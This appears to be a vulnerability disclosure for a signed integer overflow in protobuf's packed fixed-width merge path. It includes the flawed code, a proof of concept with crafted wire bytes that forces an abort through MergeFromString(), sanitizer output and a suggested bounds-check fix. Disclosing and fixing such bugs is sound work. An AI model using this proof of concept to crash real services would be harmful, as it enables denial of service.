# protobuf packed fixed-field merge: signed integer overflow in `ReadPackedFixedSizePrimitive()`

**Product:** Protocol Buffers (`protobuf`)
**Repository:** `https://github.com/protocolbuffers/protobuf`
**Component:** `targets/protobuf/src/google/protobuf/wire_format_lite.h`
**Version:** `514aceb974fbd55031169b79d2bd9f7646157787`
**Function:** `google::protobuf::internal::WireFormatLite::ReadPackedFixedSizePrimitive()`
**Location:** `targets/protobuf/src/google/protobuf/wire_format_lite.h:1117-1160`
**Type:** CWE-190 (Integer Overflow or Wraparound)
**CVSS 3.1:** 5.9 (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H`)
**Validation Status:** Confirmed against the shipped `libprotobuf.a` path through `MessageLite::MergeFromString()`

## Summary

`ReadPackedFixedSizePrimitive()` derives `old_entries` from the destination `RepeatedField`, derives `new_entries` from attacker-controlled packed field length, and then evaluates `old_entries + new_entries` as a signed `int` before calling `values->resize()` or `values->Reserve()`.

There is no guard that the aggregate element count still fits in `int`. If a destination message already holds a repeated fixed-width field near `INT_MAX`, merging a packed field with even one more element causes signed overflow. In the validated build, UBSan reports the overflow at the vulnerable line and protobuf aborts in `RepeatedField::ResizeImpl()` after receiving a negative `new_size`.

This bug is reachable through public merge APIs such as `google::protobuf::MessageLite::MergeFromString()`. It is not a fresh-parse issue because `ParseFrom*()` clears the destination object first.

## Vulnerable Code

```cpp
const int old_entries = values->size();
const int new_entries = length / static_cast<int>(sizeof(CType));
const int new_bytes = new_entries * static_cast<int>(sizeof(CType));
...
if (bytes_limit >= new_bytes) {
#if defined(ABSL_IS_LITTLE_ENDIAN)
  values->resize(old_entries + new_entries, 0);  // signed overflow
  void* dest = reinterpret_cast<void*>(values->mutable_data() + old_entries);
  if (!input->ReadRaw(dest, new_bytes)) {
    values->Truncate(old_entries);
    return false;
  }
#else
  values->Reserve(old_entries + new_entries);    // same issue
```

## Impact

1. **Availability:** a service that merges attacker-controlled protobuf bytes into an already huge message object can be killed deterministically.
2. **Reachability:** public merge-oriented APIs are affected, including `MessageLite::MergeFromString()` and stream-based merge paths.
3. **Constraint:** the target repeated fixed-width field must already be close to `INT_MAX` elements, so exploitation requires an extreme stateful precondition.

## Reproduction

### Prerequisites

```bash
cd /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/targets/protobuf
git checkout 514aceb974fbd55031169b79d2bd9f7646157787
cd /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter
```

### Build the public-API validation PoC

```bash
bash bugs/protobuf/protobuf-input-003/validation/build_impact.sh
```

### Execute

```bash
bugs/protobuf/protobuf-input-003/validation/impact_demo_bin
```

## Proof of Concept

The PoC uses a generated lite-runtime message and the public API `MessageLite::MergeFromString()`:

```cpp
impactdemo::PackedFixed32Message message;
message.mutable_nums()->Reserve(3);
message._impl_.nums_.soo_rep_.set_size(INT_MAX);

const char wire[] = {
    0x0a,  // field 1, packed repeated fixed32
    0x04,  // payload length
    0x41, 0x42, 0x43, 0x44,
};
const std::string payload(wire, sizeof(wire));
const bool ok = message.MergeFromString(payload);
```

This creates the exact precondition needed for the signed addition to overflow when one additional packed `fixed32` element is merged.

## ASan / UBSan Evidence

```text
api=google::protobuf::MessageLite::MergeFromString
initial_size=2147483647
initial_capacity=6
payload_bytes=6
new_entries=1
=================================================================
==81529==ERROR: AddressSanitizer: bad parameters to __sanitizer_annotate_contiguous_container:
      beg     : 0x603000005a18
      end     : 0x603000005a30
      old_mid : 0x603200005a14
      new_mid : 0x602e00005a18
    #0 __sanitizer_annotate_contiguous_container+0x6c
    #1 google::protobuf::internal::EpsCopyInputStream::ReadPackedFixed<unsigned int>(...)
    #2 bool google::protobuf::internal::MergeFromImpl<false>(...)
    #3 main+0x308
SUMMARY: AddressSanitizer: bad-__sanitizer_annotate_contiguous_container ...ReadPackedFixed<unsigned int>(...)
==81529==ABORTING
```

The narrower harness that calls the vulnerable helper directly shows the signed overflow at the exact source line:

```text
initial_size=2147483647
initial_capacity=6
targets/protobuf/src/google/protobuf/wire_format_lite.h:1148:32:
runtime error: signed integer overflow: 2147483647 + 1 cannot be represented in type 'int'
...
repeated_field.h:933] Check failed: new_size >= 0 (-2147483648 vs. 0)
```

## Why this matters

- The parser validates `length`, but it does not validate `old_entries + new_entries`.
- The fast path is explicitly chosen when byte limits appear safe, so the overflow occurs in a normal parsing path.
- The demonstrated consequence is a process-killing abort through a public library API.

## Suggested Fix

```cpp
if (new_entries < 0) return false;
if (old_entries > std::numeric_limits<int>::max() - new_entries) {
  return false;
}

const int total_entries = old_entries + new_entries;
#if defined(ABSL_IS_LITTLE_ENDIAN)
values->resize(total_entries, 0);
#else
values->Reserve(total_entries);
#endif
```

## Notes

- The issue affects packed fixed-width types such as `fixed32`, `fixed64`, `sfixed32`, `sfixed64`, `float`, and `double`.
- Severity is limited by the very large destination-state precondition, but the trigger itself is reliable once that state exists.
